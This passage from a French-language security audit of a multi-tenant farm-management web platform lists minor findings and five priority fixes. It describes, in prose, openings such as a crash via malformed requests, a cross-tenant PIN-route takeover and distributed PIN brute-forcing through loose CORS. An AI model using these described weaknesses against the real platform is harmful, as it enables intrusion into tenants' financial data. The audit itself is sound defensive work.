- **F2 — Fuite de message d'erreur interne vers un utilisateur tenant** (`finance.js:88` : `res.status(500).json({ erreur: err.message ... })`). Le choix est assumé et documenté côté superviseur (`plateforme.js:469`), mais ici la route est accessible à tout comptable d'une ferme et peut renvoyer des détails de l'API Meta ou de la base.
- **F3 — `checkRole` : `'admin'` passe toujours** (`auth.js:204`). Comportement implicite, non déclaré dans les appels. Aucune séparation des pouvoirs possible (un admin peut tout faire seul : créer un client, une commande, encaisser, rapprocher). Acceptable à votre échelle, à revoir quand une ferme dépassera 10 employés.
- **F4 — Dépendances.** `npm audit --omit=dev` → **0 vulnérabilité**. Deux failles « high » (`brace-expansion`, `js-yaml`) existent en `devDependencies` via Jest : elles ne tournent jamais en production, mais s'exécutent en CI sur du code de PR. Un `npm audit fix` les règle. Le remplacement du SDK `paydunya` par un client `fetch` maison (`paydunya.js:1-3`) était une excellente décision.
- **F5 — `secteur_id` figé dans le jeton** (`auth.js:22`). Le cloisonnement d'un chef de production par secteur (`production.js:7-15`) repose sur une valeur du JWT : un changement de secteur ne prend effet qu'après expiration. Se résout automatiquement avec le correctif E2.
- **F6 — `attachTenantConnection` et les réponses longues.** `release()` est déclenché sur `res.on('finish')`. Toute requête `await req.db.query(...)` postérieure à l'envoi de la réponse s'exécuterait sur une connexion relâchée. Le code actuel ne présente pas ce motif, mais c'est un piège à documenter (notamment pour les générations PDF en streaming, `finance.js:112`).

---

## 3. Les 5 actions à traiter en premier

| # | Action | Constat | Effort | Ce que ça évite |
|---|---|---|---|---|
| **1** | Ajouter un middleware d'erreur Express + `process.on('unhandledRejection')` + valider les types dans les deux routes `/login` | C1 | ~1 h | Qu'un inconnu arrête la plateforme entière en une requête, et réinitialise au passage tous vos compteurs anti-brute-force |
| **2** | Poser `app.is_plateforme_admin = ''` **à l'acquisition** de la connexion dans `attachTenantConnection` (auth.js:60), et corriger les commentaires qui affirment à tort que l'échappatoire est en lecture seule | C2 | **~15 min** | Que le filet RLS — votre durcissement post-audit — se transforme silencieusement en passe-droit cross-tenant avec droit d'écriture |
| **3** | Corriger `POST /clients/:id/pin` : `AND tenant_id = $3`, `tenantId` dans `logAudit`, `try/catch` | E3 | ~20 min | Une fonctionnalité **actuellement cassée en production** (elle verrouille le client hors de son portail et fait tomber le serveur), et un chemin de prise de contrôle cross-tenant |
| **4** | Restreindre le CORS aux origines `massla.sn` + passer le store de rate limiting en base ou Redis + verrouillage par compte sur le portail | E1 | ~2 h | Le brute-force distribué du PIN à 6 chiffres via les navigateurs de visiteurs tiers, qui contourne entièrement votre limitation par IP |
| **5** | Ajouter `token_version` et revérifier `actif` / `deleted_at` / rôle / flag superviseur dans `requireAuth` | E2 | ~2 h | Qu'un employé licencié, un poste volé ou un compte superviseur révoqué garde 12 h d'accès complet aux finances de toutes les fermes |

**À enchaîner juste après :** vérification croisée de `referenceInterne` et du montant dans l'IPN (E5), échappement des deux `${s.nom}` (M2), chiffrement des sauvegardes (M5), et contraintes `UNIQUE (tenant_id, ...)` + correction du générateur de `numero_commande` (M3 — celui-ci produira des erreurs en production de façon quasi certaine à mesure que vous ajoutez des fermes).

---

**Note méthodologique.** Deux angles morts structurels expliquent la majorité des constats ci-dessus, et méritent d'être traités comme des règles d'équipe plutôt que comme des correctifs ponctuels :

1. **pg-mem ne simule jamais RLS.** Les bugs de la famille « la requête ne pose pas le bon contexte » (E3, et le correctif du 2026-08-10 sur `parametres-paiement.js`) passent tous les tests et cassent en production. `verify-rls.js` est le bon outil — il gagnerait à couvrir chaque nouvelle route touchant une table à policy, et à tourner en CI contre une vraie instance PostgreSQL éphémère (service container GitHub Actions) plutôt qu'à la main.
2. **Aucun test n'exerce le chemin d'erreur.** C1 et E3 seraient tous deux tombés avec un seul test envoyant un corps malformé à chaque route. Un test paramétré qui bombarde toutes les routes avec des types inattendus (`null`, `[]`, `{}`, nombre) et vérifie qu'on reçoit un 4xx — jamais un crash — a un excellent rapport effort/valeur ici.
